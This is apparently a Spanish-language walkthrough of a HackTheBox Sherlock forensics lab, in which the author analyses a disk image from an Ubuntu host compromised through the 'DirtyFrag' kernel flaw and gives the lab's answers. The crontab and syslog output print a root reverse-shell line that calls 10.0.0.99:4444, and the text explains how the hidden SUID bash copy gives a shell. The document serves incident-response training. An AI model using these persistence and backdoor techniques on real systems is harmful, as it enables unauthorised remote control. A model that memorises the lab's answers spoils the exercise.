---
layout: single
title: Sherlock - DirtyFrag
excerpt: Laboratorio sobre un entorno linux comprometido con una vulnerabilidad de escalada privilegios reciente
date: 2026-9-30
classes: wide
header:
   teaser: ../assets/images/logoletsdefend.png
   teaser_home_page: true
   icon: ../assets/images/hackthebox.webp
categories:
   - hackthebox
   - soc
   - blue team
   - dfir
tags:
   - dmesg
   - linux
   - dfir
   - dirtyfrag
   - cve-2026-43284
   - forensics
   - incident-response
   - dirtyfrag
   - cve-2026-43284
   - privilege-escalation
   - page-cache-corruption
   - kernel-logs
   - dmesg
   - xfrm
   - ipsec-esp
   - setuid
   - suid-backdoor
   - persistence
   - cron
   - reverse-shell
   - shadow-file
   - hackthebox
   - threat-hunting
---

**Sherlock Sceario: A Linux workstation running Ubuntu 22.04.2 LTS was compromised through a kernel vulnerability in the IPsec (ESP/XFRM) subsystem. The attacker created a new user account, exploited the kernel flaw to escalate privileges, deployed a hidden SUID backdoor binary, and installed a malicious root cron job that establishes a reverse shell to a remote host. Kernel logs, user account records, file permissions, and cron entries were collected from the compromised machine for forensic analysis.**

------

Para este lab se nos da el siguiente `filesystem image`:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/dirtyfrag]
└─$ file DirtyFrag.img                      
DirtyFrag.img: Linux rev 1.0 ext4 filesystem data, UUID=13250d6b-5136-499a-851c-cd3105b5de92 (extents) (64bit) (large files) (huge files)
```

Lo montamos en nuestro sistema con:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ sudo mount -o ro,loop DirtyFrag.img /mnt/dirtyfrag 
```

Y pasamos rápido a las preguntas.

------------

**1\. What is the kernel version of the compromised system?**

Buscando en los logs de `dmesg`(diagnostic messages):

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ grep -i "version" var/dmesg
[    0.000000] kernel: Linux version 6.8.0-101-generic (buildd@lcy02-amd64-087) (x86_64-linux-gnu-gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04.2) 12.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #101~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Feb 11 13:19:54 UTC  (Ubuntu 6.8.0-101.101~22.04.1-generic 6.8.12)
```

---------

**2\. What is the username of the account that was used to run the exploit?**

Revisando los usuarios del sistema:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ grep -viE "false|nologin" etc/passwd 
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
t3m0:x:1000:1000:t3m0,,,:/home/t3m0:/bin/bash
mm0x:x:1001:1001::/home/mm0x:/bin/bash
svc_monitor:x:0:0::/root:/bin/bash
```

Y ahora hay que analizar los logs del audit.log, que es donde linux almacena eventos de auditoria del sistema, filtrando por la palabra `dirtyfrag`:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ grep -i "dirtyfrag" var/audit/audit.log | head
type=CONFIG_CHANGE msg=audit(1779024905.859:180): auid=1000 ses=4 subj=unconfined op=add_rule key="dirtyfrag" list=4 res=1AUID="t3m0"
type=CONFIG_CHANGE msg=audit(1779024905.913:187): auid=1000 ses=4 subj=unconfined op=add_rule key="dirtyfrag" list=4 res=1AUID="t3m0"
type=CONFIG_CHANGE msg=audit(1779024905.971:194): auid=1000 ses=4 subj=unconfined op=add_rule key="dirtyfrag" list=4 res=1AUID="t3m0"
type=CONFIG_CHANGE msg=audit(1779024906.075:201): auid=1000 ses=4 subj=unconfined op=add_rule key="dirtyfrag" list=4 res=1AUID="t3m0"
type=CONFIG_CHANGE msg=audit(1779024906.183:208): auid=1000 ses=4 subj=unconfined op=add_rule key="dirtyfrag" list=4 res=1AUID="t3m0"
type=SYSCALL msg=audit(1779024968.758:237): arch=c000003e syscall=272 success=yes exit=0 a0=50000000 a1=0 a2=79a81834ea00 a3=79a81839d0c8 items=0 ppid=4904 pid=4905 auid=1000 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts0 ses=4 comm="exp" exe="/home/mm0x/dirtyfrag/exp" subj=unconfined key="dirtyfrag"ARCH=x86_64 SYSCALL=unshare AUID="t3m0" UID="mm0x" GID="mm0x" EUID="mm0x" SUID="mm0x" FSUID="mm0x" EGID="mm0x" SGID="mm0x" FSGID="mm0x"
type=SYSCALL msg=audit(1779024968.892:238): arch=c000003e syscall=44 success=yes exit=496 a0=4 a1=7fffc5821890 a2=1f0 a3=0 items=0 ppid=4904 pid=4905 auid=1000 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts0 ses=4 comm="exp" exe="/home/mm0x/dirtyfrag/exp" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="t3m0" UID="mm0x" GID="mm0x" EUID="mm0x" SUID="mm0x" FSUID="mm0x" EGID="mm0x" SGID="mm0x" FSGID="mm0x"
type=SYSCALL msg=audit(1779024969.075:239): arch=c000003e syscall=44 success=yes exit=496 a0=4 a1=7fffc5821890 a2=1f0 a3=0 items=0 ppid=4904 pid=4905 auid=1000 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts0 ses=4 comm="exp" exe="/home/mm0x/dirtyfrag/exp" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="t3m0" UID="mm0x" GID="mm0x" EUID="mm0x" SUID="mm0x" FSUID="mm0x" EGID="mm0x" SGID="mm0x" FSGID="mm0x"
type=SYSCALL msg=audit(1779024969.076:240): arch=c000003e syscall=44 success=yes exit=496 a0=4 a1=7fffc5821890 a2=1f0 a3=0 items=0 ppid=4904 pid=4905 auid=1000 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts0 ses=4 comm="exp" exe="/home/mm0x/dirtyfrag/exp" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="t3m0" UID="mm0x" GID="mm0x" EUID="mm0x" SUID="mm0x" FSUID="mm0x" EGID="mm0x" SGID="mm0x" FSGID="mm0x"
type=SYSCALL msg=audit(1779024969.076:241): arch=c000003e syscall=44 success=yes exit=496 a0=4 a1=7fffc5821890 a2=1f0 a3=0 items=0 ppid=4904 pid=4905 auid=1000 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts0 ses=4 comm="exp" exe="/home/mm0x/dirtyfrag/exp" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="t3m0" UID="mm0x" GID="mm0x" EUID="mm0x" SUID="mm0x" FSUID="mm0x" EGID="mm0x" SGID="mm0x" FSGID="mm0x"
```

Y con `uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001` es la prueba de que se ejecutó bajo la identidad de `mm0x`

--------

**3\. What Linux distribution and exact version is installed?**

Hay que leer el `lsb-release`, un archivo de configuración donde se encuentra la información de la distribución específica que se está ejecutando:

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ cat etc/*release 2>/dev/null
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
```

**4\. What is the CVE identifier for the vulnerability exploited in this incident?**

Estamos ante la vulnerabilidad de `DirtyFrag`, marcada con el `CVE-2026-43284`

------

**5\. List all non-system user accounts on the machine in this exact format: username:UID sorted alphabetically by username.**

Usando el siguiente comando:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ awk -F":" '$1 != "root" && $7 ~ /bash/ {print $1":"$3}' etc/passwd 
t3m0:1000
mm0x:1001
svc_monitor:0
```

-------

**6\.  At what exact time was the exploit user account created?**

Filtrando en el `auth.log`:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ grep -iE "useradd|mm0x" var/auth.log          
May 17 09:35:13 local sudo:     t3m0 : TTY=pts/0 ; PWD=/home/t3m0 ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash mm0x
May 17 09:35:13 local useradd[4867]: new group: name=mm0x, GID=1001
May 17 09:35:13 local useradd[4867]: new user: name=mm0x, UID=1001, GID=1001, home=/home/mm0x, shell=/bin/bash, from=/dev/pts/1
```

A las `09:35:13` se crea el usuario `mm0x`

---------

**7\. The kernel recorded a single event that could only appear if the ESP subsystem was initialized by the exploit. What is that exact message? Copy the text only, no timestamp, no brackets.**

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ grep -iE "xfrm|ipsec|netlink" var/kern.log                       
May 15 10:09:36 local kernel: [    0.509635] NET: Registered PF_NETLINK/PF_ROUTE protocol family
May 15 10:09:36 local kernel: [    0.510078] audit: initializing netlink subsys (disabled)
May 17 09:01:17 local kernel: [    0.519826] NET: Registered PF_NETLINK/PF_ROUTE protocol family
May 17 09:01:17 local kernel: [    0.520269] audit: initializing netlink subsys (disabled)
May 17 09:36:08 local kernel: [ 2296.641117] Initializing XFRM netlink socket
```

----------------

**8\. What is the exact kernel log message that proves privilege escalation succeeded? Copy the message text only, without the timestamp or brackets.**

Leyendo el `kern.log`, los eventos después de la inicialización de XFRM

```bash
May 17 09:36:08 local kernel: [ 2296.641117] Initializing XFRM netlink socket
May 17 09:36:16 local kernel: [ 2304.134824] process 'su' launched '/bin/sh' with NULL argv: empty string added
```

-----------

**9\. How many seconds elapsed between the XFRM netlink socket initialization and the privilege escalation confirmation in the kernel log?**

Para un resultado más preciso usamos `python`:

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ python3 -c "print(2304.134824 - 2296.641117)"
7.493707000000086
```

-------

**10\. What single character in the shadow file proves that svc_monitor cannot be used for direct password-based login?**

Para esto hay que revisar los eventos posteriores a los que ya identificamos: 

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ grep -i "useradd" var/auth.log                
May 17 09:35:13 local sudo:     t3m0 : TTY=pts/0 ; PWD=/home/t3m0 ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash mm0x
May 17 09:35:13 local useradd[4867]: new group: name=mm0x, GID=1001
May 17 09:35:13 local useradd[4867]: new user: name=mm0x, UID=1001, GID=1001, home=/home/mm0x, shell=/bin/bash, from=/dev/pts/1
May 17 09:36:44 local useradd[4950]: new user: name=svc_monitor, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1
```

A las `09:36:44`, tiempo posterior a la ejecución del exploit, se crea un nuevo usuario: `svc_monitor`

Leyendo el `/etc/shadow`:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ sudo grep -i "svc_monitor" etc/shadow
svc_monitor:!:20590:0:99999:7:::
```

----------

**11\. What is the exact octal permission value of the hidden backdoor binary?**

Primero buscamos todos los binarios con el setuid activado, que permite que un archivo se ejecute con los permisos de su propietario:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ find /mnt/dirtyfrag -type f -perm -4000 -ls 2>/dev/null
     4564     16 -rwsr-xr-x   1 root     root        14656 Sep 23  2025 /mnt/dirtyfrag/usr/vmware-user-suid-wrapper
     3491     36 -rwsr-xr-x   1 root     root        35200 Mar 23  2022 /mnt/dirtyfrag/usr/fusermount3
     4232    228 -rwsr-xr-x   1 root     root       232416 Jan 16  2023 /mnt/dirtyfrag/usr/sudo
     3852     40 -rwsr-xr-x   1 root     root        40496 Nov 24  2022 /mnt/dirtyfrag/usr/newgrp
     3307     72 -rwsr-xr-x   1 root     root        72712 Nov 24  2022 /mnt/dirtyfrag/usr/chfn
     4296     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /mnt/dirtyfrag/usr/umount
     3313     44 -rwsr-xr-x   1 root     root        44808 Nov 24  2022 /mnt/dirtyfrag/usr/chsh
     3564     72 -rwsr-xr-x   1 root     root        72072 Nov 24  2022 /mnt/dirtyfrag/usr/gpasswd
     4231     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /mnt/dirtyfrag/usr/su
     3980     32 -rwsr-xr-x   1 root     root        30872 Feb 26  2022 /mnt/dirtyfrag/usr/pkexec
     4923    416 -rwsr-xr--   1 root     dip        424512 Feb 24  2022 /mnt/dirtyfrag/usr/sbin/pppd
     3924     60 -rwsr-xr-x   1 root     root        59976 Nov 24  2022 /mnt/dirtyfrag/usr/passwd
     3831     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /mnt/dirtyfrag/usr/mount
     2894   1364 -rwsr-sr-x   1 kali     kali      1396520 May 17 13:36 /mnt/dirtyfrag/var/tmp/.syshelper
```

El archivo `/mnt/dirtyfrag/var/tmp/.syshelper` es el primero que salta a la vista, está oculto a ´ls´ normal y dentro de una ruta temporal, revisándolo:

```bash
┌──(root㉿kali)-[/mnt/dirtyfrag]
└─# file var/tmp/.syshelper                    
var/tmp/.syshelper: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=33a5554034feb2af38e8c75872058883b2988bc5, for GNU/Linux 3.2.0, stripped
```

Es un ELF dinámico, stripped de 1.39 MB, sin símbolos, lo que dificulta el análisis

Analizando los permisos del binario:

```bash
┌──(root㉿kali)-[/mnt/dirtyfrag]
└─# stat -c '%a %A %U:%G %n' var/tmp/.syshelper              
6755 -rwsr-sr-x kali:kali var/tmp/.syshelper
```

Los permisos son `6755`.

Fijándonos bien, el binario malicioso tiene un tamaño similar con una copia de bash:

```txt
-rwxr-xr-x 1 root root 1384752 May  3 19:28 /usr/bin/bash
```

Comparando los hashes del binario malicioso con el `/usr/bash` del sistema de archivos de la víctima:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ sha256sum usr/bash
2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed  usr/bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ sha256sum var/tmp/.syshelper
2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed  var/tmp/.syshelper
```

Con esto, cualquier usuario local obtiene una shell con la identidad del dueño con `/var/tmp/.syshelper -p`.

-------

**12\. What is the SHA256 hash of the hidden SUID binary?**

Como ya vimos en la pregunta anterior: `2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed`

---------

**13\. What is the exact full line of the malicious cron entry? Include every field from the schedule to the end of the command.**

Leyendo el `crontab`:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ cat etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
```

Se manda una reverse shell cada minuto a `10.0.0.99:4444`

Confirmamos la ejecución de la reverse shell:

```bash
┌──(kali㉿kali)-[/mnt/dirtyfrag]
└─$ grep CRON var/syslog | grep -i "10.0.0.99"
May 17 09:37:01 local CRON[4961]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
May 17 09:38:01 local CRON[5020]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
May 17 09:39:01 local CRON[5075]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
May 17 09:40:01 local CRON[5078]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
May 17 09:41:01 local CRON[5091]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1) 
```


